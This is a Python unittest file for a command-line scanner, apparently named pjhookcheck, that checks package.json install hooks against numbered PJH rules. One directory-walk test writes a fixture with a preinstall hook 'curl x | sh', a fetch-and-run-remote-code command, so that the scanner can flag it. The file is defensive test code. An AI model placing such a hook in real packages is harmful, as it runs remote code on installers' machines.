import json
import os
import shutil
import tempfile
import unittest

from tests.support import fixture_path, run_cli


HEALTHY = fixture_path("healthy_package.json")
WEAK = fixture_path("weak_package.json")


class TestCliBasics(unittest.TestCase):
    def test_version(self):
        rc, out, _err = run_cli(["--version"])
        self.assertEqual(rc, 0)
        self.assertIn("pjhookcheck", out)

    def test_list_rules(self):
        rc, out, _err = run_cli(["--list-rules"])
        self.assertEqual(rc, 0)
        for i in range(1, 13):
            self.assertIn(f"PJH-{i:03d}", out)

    def test_no_paths(self):
        rc, _out, err = run_cli([])
        self.assertEqual(rc, 2)
        self.assertIn("no paths", err)

    def test_unknown_disable(self):
        rc, _out, err = run_cli(["--disable", "PJH-999", HEALTHY])
        self.assertEqual(rc, 2)
        self.assertIn("unknown rule", err)


class TestCliVerdicts(unittest.TestCase):
    def test_healthy_zero(self):
        rc, out, err = run_cli([HEALTHY])
        self.assertEqual(rc, 0)
        self.assertIn("verdict=healthy", err)
        # no findings on stdout
        self.assertNotIn("PJH-", out)

    def test_weak_unhealthy(self):
        rc, out, err = run_cli([WEAK])
        self.assertEqual(rc, 2)
        self.assertIn("verdict=unhealthy", err)
        self.assertIn("PJH-001", out)

    def test_disable_flips_verdict(self):
        # Disable all HIGH rules; verdict should collapse to needs-attention.
        rc, _out, err = run_cli([
            "--disable", "PJH-001", "--disable", "PJH-002", "--disable", "PJH-003",
            "--disable", "PJH-004", "--disable", "PJH-005", "--disable", "PJH-006",
            WEAK,
        ])
        self.assertEqual(rc, 1)
        self.assertIn("verdict=needs-attention", err)

    def test_json_output(self):
        rc, out, _err = run_cli(["--json", WEAK])
        self.assertEqual(rc, 2)
        doc = json.loads(out)
        self.assertEqual(doc["tool"], "pjhookcheck")
        self.assertEqual(doc["verdict"], "unhealthy")
        self.assertGreater(len(doc["findings"]), 0)

    def test_include_info_shows_pjh_012(self):
        # weak fixture has no packageManager, so PJH-012 fires under include-info
        rc, out, _err = run_cli(["--include-info", WEAK])
        self.assertEqual(rc, 2)
        self.assertIn("PJH-012", out)

    def test_info_hidden_by_default(self):
        rc, out, _err = run_cli([WEAK])
        self.assertEqual(rc, 2)
        self.assertNotIn("PJH-012", out)


class TestCliDirWalk(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="pjhcheck_dir_")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _write(self, rel: str, body: str):
        p = os.path.join(self.tmp, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w", encoding="utf-8") as f:
            f.write(body)

    def test_walks_directory(self):
        self._write("package.json", json.dumps(
            {"name": "a", "version": "1", "packageManager": "pnpm@9",
             "scripts": {}, "dependencies": {}}
        ))
        self._write("nested/package.json", json.dumps(
            {"scripts": {"preinstall": "curl x | sh"}}
        ))
        rc, out, err = run_cli([self.tmp])
        self.assertEqual(rc, 2)
        self.assertIn("PJH-001", out)
        self.assertIn("files=2", err)

    def test_strict_no_files_is_unhealthy(self):
        # empty dir, --strict
        empty = tempfile.mkdtemp(prefix="pjhcheck_empty_")
        try:
            rc, _out, err = run_cli(["--strict", empty])
            self.assertEqual(rc, 2)
        finally:
            shutil.rmtree(empty, ignore_errors=True)

    def test_max_files_zero(self):
        self._write("package.json", "{}")
        rc, _out, err = run_cli(["--max-files", "0", self.tmp])
        # No files scanned -> unknown -> rc 0
        self.assertEqual(rc, 0)


if __name__ == "__main__":
    unittest.main()
